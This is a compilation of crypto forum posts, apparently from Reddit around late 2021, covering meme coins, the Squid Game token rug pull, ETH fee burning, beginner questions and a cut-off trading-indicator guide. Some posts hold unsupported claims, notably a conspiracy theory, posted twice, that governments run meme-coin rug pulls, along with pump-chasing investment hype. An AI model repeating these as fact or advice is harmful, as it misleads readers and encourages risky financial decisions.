And yes, I'm aware there are some websites out there that are beginning to take this into consideration, but we need something bigger and more comprehensive, and most importantly more available to the public if we want it to take off. A manual for all new investors, in a way.

For me, my favourite thing is decentralisation. The first thing I see while doing my research on a coin is how decentralised it is even if the fees is expensive because decentralisation doesnt come for cheap. Thats why Im not much of a fan of alt coins that are mooning rn.

What is your favourite thing about crypto? Boundary less payments? Here just for the gains? Im asking about crypto in general, not about a specific coin so that there wont be shills. 


Would also be fun to hear what you hate the most about cryptocurrencies. 

Thank you

Some mysterious and generous trader gives you coins *f*or *f*ree, but under the condition that you must *f*ollow what he says now:

**Option A**: You receive 242 DOT *f*or *f*ree, but you must put those DOTs into a 2 year lasting **"crowdloan"** (similar to staking, but this is to support a Polkadot project to win a bid on the parachain auction. Past Parachain auctions on "Kusama"-a testnet chain for Polkadot- projects require the maximum lending time possible set by Polkadot, this time the maximum crowdloan time is around 2 years.)

**Option B**: You get 2.5 ETH *f*or *f*ree and must stake them *f*or 2 years, you may not withdraw those earlier. A*f*ter that period, you may do as you please with your *f*ree Ethereum.

What do you choose? Every choice has its pro and contra, risk and high reward or play it sa*f*e?

I'm just curious, why do most people on this sub hate meme coins? I for one invest in some very good projects, Ethereum, Polkadot, Chainlink being some of my favorites. Is it so bad that every once in a while I like to throw 3-5% of my portfolio into some shit meme coins? I'm not going to lie meme coins have made me some serious gains. What about them is so bad for the community? I like that they seem to be bringing a lot of people into crypto, but I can also see that most will probably get burned and turn their back. What am I missing?

I am the only one to realize that every time the market has some good down or up movement, placing the 4hr rsi at either the overbought or oversold bar on the major coins like xrp, coinbase will have some "connection issues"

It mostly happens when the best buy opportunity present themselves..

Am i the only one not buying the narrative ?

I get that the platforms get exponential transactions going during those times since buyers and sellers are going crazy, but why the hell didn't they figure out how to fix the issue already and boost the system... its been going on for years....

Other platform do not suffer the same issues, or if they have, issues got fixed...

Coinbase on the other hand, seems to getting off of people not being able to transact at the moment they been waiting for, for months...

Anybody feel the same? 
Or have some insights of coinbase on the matter ?

Just a random rant from someone who really doesn't know shit.

Before you people blowup like the testerone filled people you are, listen. In my own take, the crypto scene didn't really have a good reputation to begin with from most people's POV, it's something that doesn't conform with the norms so it's scary for most people, change is scary after all, but that clearly doesn't stop you from entering the space right? 

Crypto hasn't really had a good reputation to begin with. Even until now when some people hear bitcoin there are still people I see cringe thinking it's a scam... Scams have been there in every investment. Even the stock market has its own fair share of scams and people still get into the scene for what, 5-10% gain in a year then losing the gains in a month after not cashing out immediately? Personally I've been in and out of crypto for years now, I bought my $20 worth of bitcoin in 2017, my first ever crypto, then sold it for like $10 3 months later because it didn't make me a millionnaire overnight. There was even a huge ponzi scam in our country in 2017 about "bitcoin" one guy got it all just like the squid game scam recently, the difference is everyone knows his name and face but isn't in the country anymore, he even has a public facebook page that he posts regularly like an influencer. It made the news in the whole country and still a large chunk of my friends in my circle is invested in crypto and knows some shit in the scene.

Anyway I'm not really clean myself, I still gamble with shitcoins despite losing a huge amount of money on it months ago, but smart people here tend to forget that people learn from mistakes faster than when you tell them verbally. I ended up doing the 'right' and easy way. DCA. I still gamble on the side but mot that much now lol. Well I just want to say that if you actually want to, no matter how much one lose, if you see crypto as something to free you financially then it'll suck you in no matter how much you hate it.


TLDR; I'm just shilling my bags 

* SOL
* ENJ
* LINK 
* ONE
* NEAR
* ALGO
* CKB
* SUPER

Ngl I can't stop gambling so I bought SHIB a month ago and staked it for 3 months

Full disclosure: I was never tempted to buy any at any point and when I caught wind you couldnt sell, I assumed the rug pull was imminent.

So, hear me out (and downvote if you feel its needed), but would anyone have the skills/know how to find the wallet address of the rug-pullers? Im positive its been asked or done before but am too lazy to research it.

Lol, if we find the address(s) would someone in here have the connections or ability to spread a shit ton of dust thats maybe a gateway to somewhere else? Absolutely not suggesting anything illegal, but a payback of sorts. 

Dont feel too bad for the buyers, just had the thought. Could be the first time we scam the scammers.

Bitcoin just closed the highest monthly candle in its history while simultaneously seeing a 3 year supply low due to Bitcoin being moved off of exchanges and into cold storage.  This metric alone is the most important and shows that regardless of record prices, HODLers are HODLing.  Personally, Im moving coins onto cold storage too and even mining profits are going straight to cold storage. 

Bitcoin is pushing up against the 11 years resistance right now and if it can break through, we are going to see price action like never before. If it cant break through, we will enter a bear market.  However, that seems less likely since fewer and fewer coins are available for sale.

Furthermore, while the shitcoin season and extreme greed indicator makes the market seem extra frothy, it could be a sign of enhanced confidence in the crypto ecosystem and a rapidly growing user base.

While more and more noobs gamble on the dog coins, this can be seen as a rapidly growing adoption of crypto.  Rather than meme stocks, apes are buying meme coins and all those people are now holding crypto which will likely trickle into top 10 coins over time.

Bitcoin.de has sent their users an email on 20 Oct 2021 to confirm their balance. They grant a 14 day deadline for objections in case users disagree. This **14 day deadline** ends now on Wednesday (or on Tuesday if you received the E-Mail already on 19 Oct)!!!

At first glance all seemed ok to me. But then I realized that my BCH are sitting there for quite some time already. I have a balance of 10 BCH at bitcoin.de (my actual balance is different, but I write "10 BCH" here for the sake of example), but no BCHA balance is shown at all!!

After checking the "history books" I realized that there was the BCH --&gt; BCHA (Bitcoin Cash ABC) hard fork on 15 Nov 2020 on block 661648. Today 1 BCH = 590 USD and 1 BCHA = 150 USD, so omitting your BCHA amounts to losing 20% of your money (or 1500 USD in the case of a 10 BCH balance on bitcoin.de).

So better send your formal objection to bitcoin.de NOW to maximize your chances for getting heard!

PS: For the historical records and to avoid confusion:
* BCH forked away from BTC on 1 Aug 2017
* BSV forked away from BCH on 15 Nov 2018
* BCHA forked away from BCH on 15 Nov 2020 (block 661648)
* BCHA "Bitcoin Cash ABC" was "renamed" XEC "eCash" on 1st or 2nd July 2021, with denominations being 1 BCHA = 1,000,000 XEC, but many exchanges or price tickers still use the legacy symbol "BCHA".

 Over the last 7 days the Ethereum network burned more ETH than it issued - yes, thats right - Ethereum has been deflationary for over 7 days now. Due to the current PoW issuance (4.5%), a deflationary ETH was not something that was expected to happen until The Merge but due to the on-going high fees, the Ethereum network is currently burning almost 13,000 ETH per day or $55 million at time of writing - truly insane when you really think about it. 

 This is Ethereums ultra sound money design proving itself in practice, many people didnt believe we would see a deflationary ETH before the network switched to Proof of Stake - but here we are. Also, contrary to popular belief, EIP-1559 has not increased gas prices and has in fact helped considerably with spikes in demand (such as during hyped-up NFT mints) which has led to a smoother network overall. Though it is pretty amazing that Ethereum has such consistently high demand regardless of the fee burning - people are collectively paying $50+ million a day just to get their transactions processed! 

\_

I thought this was a very interesting 2 paragraphs taken from the newsletter called The Daily Gwei.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

 Because people are going to mention how crappy ETH is because of the high fees the author address this concern below:

Ive seen some people hit back at Ethereans celebrating this deflationary ETH milestone by saying that these high fees are a negative because it prices users out of the network. Though, as all of you avid Daily Gwei readers would know by now, Ethereums layer 1 is doing exactly what it is meant to be doing as a settlement layer for high-value transactions. Obviously this is lost on many people in the ecosystem (especially the newer ones) and I constantly see viral tweets about how Ethereum isnt the future of finance because of the high fees. This is obviously why layer 2s are so critical to Ethereum - they allow everyone to access the Ethereum we all know and love without the high costs (and also without the relatively slow transactions).

Speaking of layer 2s - they are obviously seeing a lot of adoption lately and Im encouraged every time I see someone change their tune about Ethereum after using a one of them. In saying that, there is still a large UX barrier for most users onboarding onto layer 2 and that is the layer 1 bridging costs. Many users can not afford or do not want to pay a $30 to $50 bridging cost just to get onto a layer 2 - we need better solutions here such as batched onboarding, direct fiat on-ramps and CEX to layer 2 bridges. Of course, these things are coming, but until they are live I do expect some poor narratives to still persist around the high gas fees but I will continue to do my best to try and educate those that will listen.

The demand to use the Ethereum network has never been greater and Im just really glad that most of the fee revenue generated by the network is now going to ETH holders (in the form of burned ETH) instead of miners. EIP-1559 is an amazing mechanism and really helps to ensure that Ethereums security, monetary policy, and overall network health remain sustainable far into the future - now we just need to work harder at getting more people to understand that Ethereums layer 1 is a settlement layer!

Hi All

Ive been in the crypto space for 5 months now and my initial investment of 250 is now worth 1000!!! (Thats approx. $34 to $1367 for my friends across the pond).

Now I know that might not be a lot to most, but it is to me. I jumped in to Crypto in May, just after Bitcoins previous ATH in April. At the time BTC was around $60K, less than a week after investing it was down at $30K.

My 250 was now worth around 70. Panic set in, but the 250 investment was back pay which I probably would have pissed up the wall, so although I was an emotional wreck, I hadnt lost money I needed.

It wasnt until mid-July that things started to pump, 2 months after I first invested and I was pretty much back to my initial investment but had a bit more knowledge under my belt. I started skimming some profits and reinvesting during the dips and building my portfolio and here I am, 6 months later and 750 up.

I got lucky with some coins. Luna I bought a fair amount in at 4 and now sit around the 30 mark and some AVAX at 8 which is now around 50. Ive taken some profits which cover those initial investments and now the rest is all free money.

If I can pass along any information to any new investors, hold and invest during the dips and take some profits when possible. Dont panic during the dips, if youre investing in good coins with good utility, they should bounce back up and more importantly.only spend what you can afford to lose! I was stressed when I hit the first major dip, but I cant even imagine how I would have been if I needed that money.


Have a great day, I hope your portfolios are looking green!

Simply put, I'm too young for it. I'm 16 and don't have a bank account (obviously) and I want to start investing in crypto, but I will not be able to do that until 2023. Am I screwed because of this? Or will it not be too late? When is it too late?  


I honestly don't think I'm screwed because I don't think that it's even close to being too late, but seeing the prices, people making money etc. makes me kinda sad I can't invest right now... I just want advice for others who are in crypto. Nobody knows what the future holds and the market will look like, and maybe it will not be a good time to invest in crypto, although I don't see why
-------------------------------

I mean who has the time really go sought out every new coin or token that gets release to try chase a pump? A project that was release 7 years ago, but has increased in value due to the adoption of crypto worldwide is still a better shot, at better gains when you DCA and HODL. Bull markets are fun and let you think it's easy money, but when bear markets hit, solid projects will survive and continue to fluctuate while most of the empty barrels will be out the way. 

Don't get caught in the hype and try to fomo in meme tokens like  squidgames. We all saw what happened. It won't be the first or the last. White papers are there for a reason (even tho we've seen whit paper of projects that's battling for life now). Every coin and token has its season. Long term has given more than short term ever could. Remember crypto  millionaires were form from the bear market. Stick to solid projects that has a future in the adopting world. 

Wishing you all more gains.

So Im new to cryptocurrency, and I dont mean a couple months new, I mean Ive been part of this world for a few days now. 

However Im not in completely unknown territory, I have followed the crypto markets for a little while, enough to have a brief understanding.

My main problem is the content surrounding cryptocurrency, like a lot of people Ive been going on YouTube to try and get some information and even buying advice (I have only put small amounts in ETH and BTC so far.) but simply I cant trust these people. 

The bright thumbnails, the red arrows, the cheesy surprised faces and even the way a lot of these people talk, my lie/scam detection in my head goes off.

Ive rattled on long enough but I suppose this comes down to asking where to find the best quality information about crypto and movements/potential movements in the market?

I don't know anything about The Hoff's coin but something about seeing David Hasselhoff as a Roman Emperor brightened my morning ...

Makes me think about why crypto weirdness is such a good thing: Like, yeh, I want to (and like to) make money but having fun along the way is more important than just having a laugh.

I like that crypto can be super weird: from PotCoin and porn coins to TrumpCoin and PutinCoin. I don't just like it, I think its actually important. Yeh, yeh it sounds preachy but stay with me ...

Humor, by definition, is irreverent, and irreverence is the most frightening thing in the world to autocracy and to the autocrat. Irreverence strikes at the heart of their power, their power to intimidate, their power to control through fear, and ultimately their power to control, to hoard and to monopolistically distribute resources.

Isn't that the whole point of crypto? Democracy? To put the power and responsibility of currency in the currency holders' hands? I know it solves real world issues but, at its core, solving those challenges stabs at the heart of governmental and corporate control.

I think we all should have more fun: it's good for us and good for the world.

But, enough my rambling morning thoughts ... enjoy David Hasselhoff as a Roman Emperor:

(Have an awesome day all)

I've learned a lot in my short time here! 
Some complain this sub is an echo chamber.  There may be some truth in that,  however echoing good advice is OK in my book!  
I would have stuck with coinbase, not knowing coinbase pro is free if no-one pointed it out. 
I would have fomo dumped into coins at their ATH had it not been echoed around here to not do that.   
I probably would have bought squid and had no idea white papers exist if it weren't for this sub. 
 
I still don't understand or am too lazy to stake,  but I see it mentioned regularly here.   

There may be some mild shilling here, but it's on decent coins and I'm up on everything I bought into  and trust in. except YFI, Noone mentions it, ath is higher than btc and its only 34k right now, however the devs are anonymous and I learned that's a red flag.  
Idk maybe this is a shit post,  but I'm grateful for this community.

I'm a complete beginner, and since the idea of putting real money into something I don't understand scares me, I figured it would be best to learn something before. I spent the whole day watching YouTube videos but it's still confusing as fuck, I don't understand how do they work, what should I buy, which platform to use , etc.. Can someone provide me some REALLY dumbed-down learning material? I have no knowledge in economics and very little money I'm comfortable investing, is crypto even a good idea? Very lost, thank you for your help

My phone is old and dying. What happens to my Google auth if it just dies? Or I get a new phone? Or for anyone whose phone is stolen or lost? Do we just lose access to all of our 2fa?

We need a guide on how to get a new phone and maintain my Google authenticator. 

I've learned that if I redownload it onto a new device from the same google account it does not persist, and I'll be unable to log in to my 2fa. It's device specific, NOT account specific. 


Do I need to get some kind of authenticator restore key from every single service I use and then manually re-do each one? I've already checked the main exchange I use and cant find anything about re-establishing a new device for authentication..


Thanks in advance

Saw on a Reddit page that Mark Cuban was giving away $100 in BTC if you created an account on Voyager and funded it with $100 and then make a $10 purchase (between the dates of 10/28-10/31 or 11/1). I was skeptical about it but tried it out. Just checked my portfolio and low and behold I had an extra $100 in BTC!! Pays to have cash on hand when things like this happen, free $100 in BTC is a no brained and Im glad I pulled the trigger on this one. Hope it worked out for others as well and as always keep an eye out for free crypto!!

I recently had an injury so I had to shift all my focus to something else so I have been just fuckin around with investments and I'm up like %400 from when I initially started. 

&amp;#x200B;

My Questions are that I use multiple exchanges like Coinbase pro, [Crypto.com](https://Crypto.com), [Gate.io](https://Gate.io), and I don't really have a centralized wallet to utilize I guess. I'm browsing through some of the things you can do on [Gate.io](https://Gate.io) that are interesting. I'm basically just looking into some tips or some reading I can do to enhance my crypto knowledge.

Tips that have helped you, Where to store current crypto, mistakes you made in the beginning, etc...

Anything would be helpful! 

# Thank you!!

For all my fellow Canadians, how do you go about funding accounts to buy altcoins, especially in smaller amounts?

Let's say I only wanted $100USD worth of an alt on Kraken or some other exchange, I would need to either pay massive fees to send a wire, or use a debit card (if accepted) and overpay fees. In many cases there may also be a delay to receive the funds.

If I want to fund with another crypto, I can go somewhere like NDAX and buy USDC and transfer it over but then I also end up paying somewhere around $20-30CAD just in withdrawal fees.

So how do you guys do this quickly and at reasonable cost for smaller amounts? Thanks!

The world's largest crypto exchange just suspended all crypto withdrawals. I have had a few bad experiences with Binance and I believe this is not a great sign if they can't handle the traffic. If nothing else, this is a good reminder to either have crypto on multiple exchanges (in case one goes down for a bit) and also to consider having your crypto stored on your own wallet off of an exchange. If your crypto is sitting on an exchange it means you are at the mercy of the exchange to not collapse, get hacked, or freeze.

Polygon  Nightfall is a groundbreaking rollup that combines ZK and Optimistic  rollups. It's lightyears ahead of what the competition has to offer, and  it's just the start for Polygon. No one talks about this enough. It's  not about the charts, It's about the tech they've been bringing and the  bullish sentiments they've been dropping.

This  chain has been working with the likes of Draft Kings, Coinbase, Sushi,  Shopify. They've been letting you do things like mint on MATIC and sell  on the Ethereum mainnet.

Sure it's  pumping but look at the tech, look at what's happening. I think this is  the best way to catch the pump before it happens. I also think with  what MATIC is bringing to the table. They can start to take over real  soon.

I used moonpay at first worked a couple of times. Now it keeps telling me I have exceeded my daily limit. Havent been able to buy for days. 

I was buying polygon (matic) and using that to buy from quickswap. 

I checked out simplex and their matic is (erc20)
So not what I am looking for. 

I am pretty sure matic on coinbase is also (erc20). So turn it into regular matic I need to go through extra steps on the matic network correct? 

I tried sending some eth from my coinbase wallet but gas fees are way too high the past few times I checked. 

Matic was the default chosen for the swap on quickswap. So I was trying to keep it the same. Not sure if I can use any of the other tokens. 

Is there an easier way to fund my trustwallet? I have a high limit on purchase power on coinbase. So I could send eth and pay the high gas fees. I dont want to buy a coin on coinbase that wont work on quickswap. Any suggestions?

Let's face it, most people who aren't familiar with crypto already think it's a scam. I've just gotten into this world and the amount of time's I've been told "not to buy this token, it's clearly a scam!" is scary. The token: BTC. Anyways, I was just wondering since SQUID (Squid Game Token) got so much hype by the media and days later had this massive rug pull, this could be something bad for the crypto world's image. "Oh, this crypto which was on TV was a scam so the next crypto on TV will be a scam too" is a logic I'd apply if I hadn't know about crypto, tbh. Anyways, I'd like to know what you think about the impact this rugpull will have on crypto's image to overall public, will it be bad or no one will ac

Please please please dont buy anything related to Squid or Marbles after the crash. I saw a few comments this morning saying the squid rugpull is actually a buying opportunity for a slight recovery/flip.

Yes dead cats can bounce. But this dead cat is super glued to your hands. If youre new or naive and think this is a good idea please dont. If youre just shitposting have fun I guess.. 

-

Alright to make sure I hit the minimum word/character count ignore the ramble. 

The #1 Doge wallet recently dropped from 36.7B Doge to 4.1B Doge it looks like most of it was transferred from cold storage to a hot wallet days before RH wallet waitlist is set to start getting access.

Im hoping this should be enough text now to my post


Tldr; yes sometimes you can make money post rugpull but youre buying an asset you cant sell. Stay away.

I'm a huge fan. So please. Just devil advocate this with me. How do we expect people to switch to ETH, for example, if the fee is 10% on top of the "app" fee and any tax on the transaction. I was just moving stuff from cojnbase to the wallet and was gonna lose 10% to a network fee for the miners. Which I get, they need paid to make it all go round. But 10% on all transactions? As much as I love crypto, why would I make a car payment from a crypto wallet if it costs 10% more than the payment itself. All of this is just me wondering about how this is actually used in the future. And if it replaces USD, it'll need to address this. Maybe there is an upgrade coming for ETH or a coin I'm not familiar with. ETH2, I don't think it removes the fee.

For example - I want to create a crypto-oriented social network. It requires a bunch of people to write code, so let's say I need to raise $1mil. I decide to make an ICO and sell the platform's token, but I want my investors to see that I don't want to scam them.

First thing that pops in mind - lock 100% of the liquidity and then buy like 30% during the honest launch. But it may pump and dump dramatically, also I will need to sell it to pay the salaries, thus dumping the price. 

Another idea - locking up 100% of the supply in a smart contract, that will automatically add 10% of the supply to the pool every month. Then again it makes the whole model extra-inflationary, also there will be obvious dumps at the end of every month. 

Minting is another piece of bs - in my experience, any project that had a minting process in their ICO phase appeared to be a terrible scam, for example CLVA with a $4mil rug and PXP with a $56 mil soft-rug. Because minting is still centralized, it's just giving up your money to somebody.

TL;DR How can one make a project, that will a) exclude the possibility of a rug-pull b) prevent whale dumps c) still raise the softcap?

Hello fellow traders.  Really I'm just looking for as much advice as I can here.  I have been Crypto trading for nearly a year now and I have both short and long-term investments/goals.  We're all out here trying to find that next big hit.  It's a tale as old as time, not entirely different from the gold rush in the 1800s.  Many of us search, very few of us will find.

I read conversations about Shiba and now this Squid Game.  How do people even find out about these projects?  I keep reading about Squid Game and the millions lost by investors, but how does one even hear about these projects?

Anyway, I'm not looking for the next shitcoin.  I'm looking for the next legitcoin.  Anything with "doge" or "Shiba" in it's name (ex. Doge moon) I don't even take a second look at.  Or anything referencing space (ex. Mars).  I want to find the next Algorand, Cardano, or Bancor.  And then I want to learn how to buy these coins before they hit the exchanges like Coinbase.  Once a coin has hit Coinbase it's harder to strike it big.

Is there a way to find out the Coins exchanges are considering adopting into their list of tradeable coins?  

I know there is no perfect process for success, otherwise we would all be doing it.  But I would love to hear your thoughts and strategies to researching the up-and-coming coins, and how you separate the coins you're considering and the coins that are absolute no's.

I'm having a difficult time understanding how to get the best out of trading/staking my crypto. Right now I have accounts on Coinbase, [Crypto.com](https://Crypto.com), [Gate.io](https://Gate.io) all with different assets. I'm guessing it really doesn't matter but trying to get an idea if I should store my shares in one location or keep them directly on the exchange itself?

&amp;#x200B;

I started with a small amount about 2 weeks ago and I'm up over %300 I'm guessing out of riding trends and using Coinbase pro limit buy/sell. But I'm trying to get a better understanding and browsing around [gate.io](https://gate.io) I saw many different investment options or things I could participate in to potentially grow my earnings. 

&amp;#x200B;

I love making money but this is more of a hobby for me I'm not really risking a lot and just playing around with day trades and HODL on things I think promising. I was addicted to fitness/working out but due to an injury I have taking up investments and have just been teaching myself as I go but any information that has helped you succeed more or that you wish you knew earlier is greatly appreciated. 

Tips? Options? Recommended reading? 

Like I said I'm doing pretty well so far and that's great I'm just trying to really get good at this and gain some knowledge from the experienced out there. 

&amp;#x200B;

Thank you!

Hi,

I'm new to the whole game. My portfolio is not that big (no more than 1000$). I currently have in ETH/ADA/SOL/MATIC.

I like Dot/Terra as well but I can't really commit a whole lot of money outside of a bi-weekly deposit ranging from 50$. Is it better to just keep pumping ETH or getting Dot/Terra and doing incremental buys?

There is a lot of neat projects out there so I have serious FOMO about them but also not a lot of wiggle room financially for now so I worry about over diversifying and making no gains anywhere but also worry about missing out.

Anyone in a similar boat?

As Crypto gains more and more traction, we are constantly seeing more meme coins popping up. DaddyDoge, PapiShiba, ElonFlokiCum, if you come up with a few dumb words and slap them together, there's probably already a token running on the Binance Shitcoin Chain that occupies this name... 

It's very clearly a scheme for people to profit heavily from the ignorance of new crypto investors. Now I'm not calling everyone who buys these stupid ass coins **ignorant**, some people know how to play the market and make money. That's fine, more power to you. (Just know that you are part of the scheme, and are contributing to some poor soul losing their money. But you could argue that this is fine, as they have to learn somehow. Right?) 

**Anyway**, the theory I have in mind doesn't really have any ground to stand on. Hence why it is just a theory. But it does kinda make sense. Let's think for a second who crypto hurts the most... well that would be governments, bankers, big corporations, etc. You know, anyone who loses even an infinitesimal amount of power from the success of it. Right? Now, who benefits from crypto? That would be the likes of you, me, our families/friends, just the general population really. 

Well if you aren't already aware, the people in power don't really like the general population making money. They would rather us stay poor and miserable so that we have to look up to them. Giving them even more power, and they do love power. 

So let's put two and two together here and think about how our loving government could damage the crypto space, without losing billions in the process attempting something like a 51% attack. Better yet, how could they **GAIN** money, while subsequently damaging this space that we have worked so hard on... **hmmmm**.... 

**Well.. by making a bunch of stupid memecoins, roping people in, and pulling the rug. Of course! Just doing this over and over again, all while making the space look like a complete joke and taking more retail money.** 

**Think about it...**

Now I'm not saying Biden is sat at his desk coding the next shitcoin to scam people with. He can't even not **shit himself**, poor guy. But it's not unheard of for the government to just pay private companies to do this sort of thing for them. Maybe they just let them keep a certain percentage while granting them immunity from any potential future lawsuits. Not that they would face any legal action anyway, with the space being unregulated. **Maybe this is why it is still so unregulated..** 

**I mean, it's plausible. Right?** 

Something to think about anyway. Maybe I have too much time on my hands, coming up with theories like this. But I'm genuinely convinced that this could be the case. It could of course just be greedy scammers (not the gov kind), and I'm sure many of them are. But the ones with seemingly endless money for marketing, bots to shill, liquidity to get it started, etc. Well it **could** be the case.


**TL;DR**
I think that some of these bigger meme coins are a ploy by the government to take your money, all while shitting on the crypto space and laughing at you. Call me crazy.

 I've  been redpilled on Cardano in the past few months and I feel sick of how  much I believed in the hype now that I look back. I'm only mad at myself for perpetuating  this hype for half a year.

Cardano  is an ok blockchain and I wish the IOG engineers the best in overcoming  its current issues and limitations but the community is one of the most  ignorant I've met and realizing that I was part of the hype fuel makes  me mad.

***Downright lies from Charles Hoskinson about TPS that I believed***

This [VIDEO](https://www.youtube.com/watch?v=8oBUiOLBrBg&amp;t=210s)  was posted at the beginning of the year. At 3:25 Charles says that  Cardano doesn't need sharding because its base layer can do 1000 TPS.  That's a downright lie and [I'll just leave this post here if you want to know why](https://np.reddit.com/r/cardano/comments/pf25jk/without_hydra_cardano_probably_wont_be_faster/).

***Sensationalism and hype that I believed***

[Just read the title of this reddit post.](https://np.reddit.com/r/cardano/comments/lsoukq/cardano_just_won_the_stablecoin_arms_race_and_no/)  When you live in a bubble it's hard to compare with the outside world.  Babbel fees in Cardano is an interesting feature but later on I learned  that other blockchains can do the same. [Listen to this presentation](https://www.youtube.com/watch?v=s8tdRCnt9O4&amp;t=1376s)  from Polkadot's Acala parachain at 22:50 talking about the same thing.  My beef here is not that it's a bad feature, it's how the community  interprets it and presents it. And lastly, that post is 8 months old and  still there are no stablecoins on Cardano anyway, so much for winning  the race.

***Cardano's 100% decentralized hype***

If  you remember back in March the Cardano community celebrated for some  reason d=0 (100% decentralized)  - all it meant is that IOHK is not part  of the block producers anymore. This was fueled by people who didn't  understand what it meant and myself and many others (to this day)  believe based on that that Cardano is the most decentralized PoS  network. All you have to do is take into consideration its stake  distribution and  Nakamoto Coefficient of 8 which make it very average  in terms of decentralization.

***Best staking experience that will take the world by storm***

Can't  count how many times this was a main selling point in Cardano  communities. I was adamant that based on this alone Cardano should be  very valuable, I mean the staking experience was so easy. That was until  I tried DeFi on other chains and discovered liquid staking where you  basically stake your tokens and get back a wrapped token like stETH or  stSOL that you can use in DeFi, provide liquidity, swap to the real  thing or do whatever you want with it, withdraw whenever you want, all  while still receiving staking rewards

I'm  just tired of all the sensationalism and hype after months of looking  over the fence at other chains and ecosystems and actually experiencing  DeFi instead of fantasizing about it on Cardano. I wish Cardano the best  but I'm out.

Let's think for a second who crypto hurts the most... well that would be governments, bankers, big corporations, etc. You know, anyone who loses even an infinitesimal amount of power from the success of it. Right? Now, who benefits from crypto? That would be the likes of you, me, our families/friends, just the general population really.

Well if you aren't already aware, the people in power don't really like the general population making money. They would rather us stay poor and miserable so that we have to look up to them. Giving them even more power, and they do love power. 

So let's put two and two together here and think about how our loving government could damage the crypto space, without losing billions in the process attempting something like a 51% attack. Better yet, how could they **GAIN** money, while subsequently damaging this space that we have worked so hard on... **hmmmm**....

**Well.. by making a bunch of stupid memecoins, roping people in, and pulling the rug. Of course! Just doing this over and over again, all while making the space look like a complete joke and taking more retail money.**

**Think about it...*

Now I'm not saying Biden is sat at his desk coming up with the next shitcoin name to scam people with. He can't even not **shit himself**, poor guy. But it's not unheard of for the government to just pay private companies to do this sort of thing for them. Maybe they just let them keep a certain percentage while granting them immunity from any potential future lawsuits. Not that they would face any legal action anyway, with the space being unregulated. 
**Maybe this is why it is still so unregulated..**

**I mean, it's plausible. Right?**

Something to think about anyway. Maybe I have too much time on my hands, coming up with theories like this. But I'm genuinely convinced that this could be the case. It could of course just be greedy scammers (not the gov kind), and I'm sure many of them are. But the ones with seemingly endless money for marketing, bots to shill, liquidity to get it started, etc. Well it **could** be the case.


**TL;DR**
I think that some of these bigger meme coins are a ploy by the government to take your money, all while shitting on the crypto space and laughing at you. Call me crazy.

The scammer behind the Squid Game cryptocurrency have pulled the rug on the project making off with an estimated 2.1 million. Even a blind man could have seen this was a scam but yet people still invested because of their pursuit for those x100000 gains.

The coin launched last week which included the usually red flags of a rug pull project with bizarre spelling on their website, no commenting allowed on their Telegram and Twitter accounts and the biggest red flag was those who purchased coins were unable to sell no matter how high the prices went. It just shows how desperate people were for those gains no matter the amount of red flags. It was as if they were telling people they were a scam with how much red flags were visible yet people still gave them their money. I just don't know who would look at a project like that and think it's real. 

I'm not saying to not take any risk when investing because I can't tell you how to invest your money. What I'm say is look for red flags when investing in new projects, join their socials and see what people are saying because making money or gains from a project doesn't guarantee it would be around forever or you would be able to withdraw your money. So will we have any more similar Mando and Squid Game cryptocurrency scams for the rest of the year.... I hope not 

Always remember don't invest what your are not willing to loose!!!!

https://preview.redd.it/y1fv96dz00x71.png?width=1167&amp;format=png&amp;auto=webp&amp;s=3d8364588ef925adb02f202a9be6db643174a9d9

**Cipher A**

https://preview.redd.it/602b3b9010x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=bc721da4ea52ea4e5870fb7e0c2b8d31870a378c

**Cipher A**is comprised of 8 different EMA ribbons. These ribbons change color based on the trend of the market. Cipher A also has multiple symbols that populate on the candle stick chart to give a visual cue of what could happen in the market.

* **EMA Ribbon:**8 different EMA values, editable to your choosing. In its default settings, the ribbon color shows what trend we are in.- **Blue or White**= bullish- **Grey**= bearish
* **Yellow/Green Diamond:**bullish continuation
* **Red Diamond:**trend weakening.
* **Green Circle:**bullish indicator, if followed by a yellow/green diamond, a breakout is possible.
* **Red X**: Bearish indicator, if followed by a red diamond, a breakdown is possible.
* **Blue Triangle**: Trend reversal indicator, momentum is decreasing, and a reversal is near
* **Blood Diamond (large red diamond)**: Bearish indicator, if paired or followed with a red x or smaller diamond, a break downward is likely.

**Cipher A**looks great visually, however**Cipher B**is where you really make most of your trades from.

**The two best parts from Cipher A:**

1. **Blue triangles to prepare for a reversal**. If you see this, make sure you have your stop losses set.
2. **EMA ribbon**to help detect trends.- **Hint:**disabling all ribbons except 4, 5, and 6, still allows us to see the trend without the chart being too busy.

**Cipher B**

&amp;#x200B;

https://preview.redd.it/2jvqsya110x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=9964ab4ed7364d82425fbe1d569db7c67baaf55c

**Cipher B**is a combination of multiple oscillators in one. There are multiple waves to pay attention to.

At first look, this can look very chaotic and confusing, but lets break things down one by one.

* **Blue waves:**Momentum wave.- Commonly used as a primary indicator
* **Red and green dots (on waves)**: wave/RSI crosses.- **Red**= price is currently moving lower.- **Green**= price is currently moving higher- Used as entry and exit points.
* **Green and red lines on waves:**hidden divergences- Assist with the blue wave trading strategy.
* **Floating Dots above/below blue waves- Green**= local**bottom**, look for additional buy indications- **Red**= local**top**, look for additional short indications
* **Yellow Waves:**Volume Weighted Average Price (VWAP)- Commonly used as a primary indicator, especially on shorter time frames
* **Green and red waves:**Money flow indicator (Green Money flowing in, red money flowing out)- Can be used as a standalone indicator, can be used with VWAP.
* **Blue/Purple line:**Stoch RSI- Not necessary and can be disabled. We will discuss this in this guide, but we do not personally use them for the main strategies.- When the**Stoch RSI is low**, and crosses to go up (turn blue), you buy.- When the**Stoch RSI is high**and crosses to go lower (turn purple), you sell. Simple and can work as its own strategy.

**Please Note:**Some of the triggers above are based on lagging indicators such as RSI divergences. That means some of these dots and triggers will not display live but rather 2 intervals back. This does not mean that its repainting, its simply because certain indicators are lagging indicators. Action can still be taken on lagging indicators. It should not impact the**main**strategies outlined below.

**Blue Momentum Waves**

https://preview.redd.it/avz9vbq210x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=2a5155fa4ca0b35f7df2ff26f9cc5ef563f2e42e

For this indicator, you are looking for three waves in total:

* Wave**One**and**Two**on the same side of the Zero line.
* **The Gap**between the two waves on the other side of the Zero line.

1. Waves**below the Zero**line indicate a**long.**
2. Waves**above the Zero**line indicate a**short.**

You can see how this indicator works in the three trades above.

**Rules for this strategy:**

